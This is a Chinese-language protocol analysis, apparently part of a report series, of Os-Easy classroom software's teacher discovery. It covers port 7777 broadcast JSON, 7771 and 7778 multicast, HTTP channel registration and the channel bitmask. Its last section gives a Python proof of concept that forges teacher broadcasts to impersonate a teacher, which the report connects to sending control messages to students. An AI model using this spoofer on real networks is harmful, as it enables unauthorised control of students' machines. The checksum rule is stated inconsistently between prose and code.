# 01 教师发现机制与广播

> 本文汇总 Os-Easy 教学系统"教师端/学生端相互发现"机制的完整分析：
> 发现通道、7777 广播报文、channel 编码、7771 扫描、屏幕广播（7778）、频道注册。
> 数据来源：样本静态分析 + 现场抓包（09-12 / 09-14 / 09-15）。
> 分析日期：2026-09-15

---

## 一、发现机制总览

系统采用**多通道发现机制**，教师端同时做以下事情（由定时器驱动）：

```
教师端 ──① UDP 广播(7777)    ──> 局域网内所有学生端     （每 3 秒）
教师端 ──② UDP 组播(7771) "teacher" ──> 频道扫描          （每 ~0.11 秒）
教师端 ──③ HTTP 注册          ──> 中心注册服务器(channel_register)
学生端 ──④ HTTP 匹配          ──> http://IP:port/channel_match
```

## 二、① 7777 教师身份广播

### 2.1 触发（静态分析）

`MainLogic.dll` 中 `SetTimer(..., 0x5e8, 3000ms)` 定时器每 3 秒触发，调用 `FUN_1005ae30` 构造广播 JSON。

### 2.2 报文内容

```json
{
   "channel" : 4,
   "checksum" : 54503,
   "msg_id" : "teacherip",
   "teacher_ip" : "192.168.5.18"
}
```

构造顺序（`FUN_1005ae30` 反编译）：

```c
add("teacher_ip", 本机IP)          // local+0x40
add("checksum",  FUN_1004c380())   // 6位奇偶校验和，见 07 报告
add("channel",   频道号)            // local+0x3c
add("msg_id",    "teacherip")
```

> 报文为 **UTF-8 明文 JSON**，首字节 `7b`（`{`），**无任何前缀**。

### 2.3 字段

| 字段 | 含义 |
|---|---|
| `channel` | 频道**编码值**（位掩码，见第五、六节） |
| `teacher_ip` | 教师机 IP |
| `checksum` | 6 位奇偶校验和（算法见 [07 报告](./07_建议点深挖.md)） |
| `msg_id` | 消息类型标识（固定 `"teacherip"`） |

### 2.4 端口

- 广播端口 = `ChannleScanPort` = **7777**。
- 端口值通过配置系统 `FUN_10002a50()/FUN_10020aa0()` 从配置 map 动态读取。

### 2.5 现场抓包观测（09-12，教师机 `192.168.5.18`）

| 项 | 值 |
|---|---|
| 目标地址 | `255.255.255.255:7777` |
| 次数 / 频率 | 105 次，每 3 秒 |
| 长度 | 105 / 106 字节交替（checksum 位数变化导致） |
| HEX 首字节 | `7b`（`{`） |


## 三、② 7771 频道扫描

现场抓包观测（09-12）：

```
No.  Time     Source        Destination  Proto Len  Info
423  31.331484 192.168.5.18  229.9.5.18   UDP   49   59142 → 7771 Len=7
```

- 载荷：HEX `74656163686572` = 纯文本 `"teacher"`
- 组播地址：`229.9.5.18` → 规律 `229.9.<ip3>.<ip4>`
- 频率：约 0.11 秒一次（高频）
- 作用：在 7771 频道上持续宣告"我是教师"，供学生端发现教师。

## 四、③ HTTP 频道注册 + ④ 频道匹配

同一定时器里，教师端向中心服务器 POST：

```
http://{RegisterServerIp}:{VdiChannelServerPort}/channel_register?ip={教师IP}&channel={频道}
```

| 配置项 | 含义 |
|---|---|
| `RegisterServerIp` | 注册服务器 IP |
| `VdiChannelServerPort` | VDI 频道服务器端口 |

学生端也可通过 HTTP `http://IP:port/channel_match` 主动匹配频道；
频道→班级映射缓存于 `channeltoclass.cache`（`ChannelToClass::Load/Save`）。

## 五、channel 编码规律（位掩码）

### 5.1 实测值（09-14 / 09-15 抓包）

| 教师机 IP | channel 值 | 二进制 |
|---|---|---|
| `192.168.0.200` | 2 | `0000 0010` |
| `192.168.1.200` | 4 | `0000 0100` |
| `192.168.2.200` | 8 | `0000 1000` |
| `192.168.3.200` | 16 | `0001 0000` |
| `192.168.1.57` | 640 | `10 1000 0000` |
| `192.168.5.18` | 4 | `0000 0100` |

### 5.2 规律

| channel | 表达式 | 置位 bit | 对应频道号 |
|---|---|---|---|
| 2 | `2^1` | bit 1 | 1 |
| 4 | `2^2` | bit 2 | 2 |
| 8 | `2^3` | bit 3 | 3 |
| 16 | `2^4` | bit 4 | 4 |

即 **`channel值 = 2^(频道号)`**（第 N 频道 → `1 << N`）。

多频道叠加：

```
640 = 512 + 128 = 2^9 + 2^7  →  频道 7 + 频道 9
```

**结论：`channel` 为位掩码，一位代表一个频道，可多频道叠加。**

```
channel值 = Σ (1 << 频道号)
```

### 5.3 与配置对照

样本 `skin/core.conf`：

```
/channel/2/       → 频道号 = 2
/multichannel/1/  → 多频道支持开启
```

- 配置频道号 2 → `channel值 = 1 << 2 = 4`
- 与 `192.168.1.200` 实测广播值 4 一致。

> 即：界面/配置中的"频道号"与广播中的 "channel 值" 不同，后者为位编码值。详见 [13 号报告](./13_频道与机房隔离机制.md)。

### 5.4 checksum 字段

同一教师机、同一 channel，checksum 每次不同（如 `212727` / `12303` / `672303` / `432763`）。
其值随广播变化，非固定内容校验。生成规则见 [07 报告](./07_建议点深挖.md)：**6 位十进制、从个位起"偶数位取奇数、奇数位取偶数"**（已由 15670 条抓包样本验证，100% 符合），并非时间戳或随机数。

## 七、屏幕广播（7778）

现场抓包观测（09-12）：

```
No.   Time      Source        Destination     Proto Len   Info
1901  120.479790 192.168.5.18  229.1.5.18      UDP   1458  8778 → 7778 Len=1416
```

载荷解码：

```
ff ff 00 00 | 8d 00 80 07 38 04 00 00 | 80 07 38 04 | 00 00 00 01 67 42 c0 28 da ...
   ↑2字节头      ↑ 自定义头字段                    ↑ H.264 SPS（67 42 c0 28 da）
```

| 项 | 观察 |
|---|---|
| 封装 | **自定义 2~16 字节头 + H.264 裸流**（非 RTP） |
| 传输 | **组播**，非单播 |
| 组播地址 | `229.1.5.18` |
| 组播规律 | `229.1.<教师IP第3段>.<教师IP第4段>` |
| 编码器标识 | 明文 `x264 - core 148 r2762 90a6` |
| TTL | 1（限制在本局域网） |
| 触发 | 用户点击"屏幕广播"时突发发送（90 帧 / 0.12 秒，非周期） |

## 八、学生端如何找到教师端

1. 学生端监听 `ChannleScanPort`（7777）UDP 广播，收到后解析 `teacher_ip` + `channel`；
2. `StudentLogic.dll` 中 `get teacherip : %s`、`IpProto:%d,teacherip:%s` 记录教师 IP；
3. 也可通过 HTTP `http://IP:port/channel_match` 主动匹配频道；
4. 频道→班级映射缓存于 `channeltoclass.cache`（`ChannelToClass::Load/Save`）。

### 教师/学生 IP 的记录

- 教师端广播的是**自己的 IP**（`teacher_ip`）；
- 学生端收到 `set-teaAndStu-ip` 指令后，在 MMPC 内存结构记录 `teaIp`/`stuIp`（日志 `teaIp:192.168.1.200,stuIp:192.168.1.64`）；
- 教师 IP 后续用于启动 `MultiClient.exe 教师IP 学生IP` 等操作的参数，**并非用于鉴权**（见 [02 号报告](./02_行为管控指令.md) / [07 报告](./07_建议点深挖.md)）。

## 九、对工具开发的指导

| 目标 | 依据 |
|---|---|
| 伪造教师广播 | 需复刻 7777 报文：`{"channel":N,"checksum":动态,"msg_id":"teacherip","teacher_ip":"<伪造IP>"}` |
| 是否需伪造 7777 | 若目标学生已连教师端，仅发管控报文即可；若要"无教师端环境下让学生认为有教师"，需伪造 7777 |
| channel 取值 | 必须发**位编码值**（如 2 频道 → 4），详见第五节 |
| checksum | 每次变化，不可固定 |
| 组播地址 | 7771 用 `229.9.<ip3>.<ip4>`；屏幕 7778 用 `229.1.<ip3>.<ip4>` |

### 7777 伪造示例（Python）

```python
import socket, json, random

def fake_teacher_broadcast(channel, teacher_ip, times=1, interval=3):
    for _ in range(times):
        # checksum：6 位十进制（奇位奇、偶位偶，见 07 报告）
        checksum = 0
        for i in range(6):
            base = random.randint(0, 9)
            checksum = checksum * 10 + (base if base % 2 == i % 2 else (base + 1) % 10)
        msg = json.dumps({
            "channel": channel,
            "checksum": checksum,
            "msg_id": "teacherip",
            "teacher_ip": teacher_ip
        }, indent=3, ensure_ascii=False)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.sendto(msg.encode('utf-8'), ("255.255.255.255", 7777))
        s.close()
```

> checksum 格式（5 位 vs 6 位）会影响报文长度（105 vs 106），学生端可能校验位数，建议完整实现。
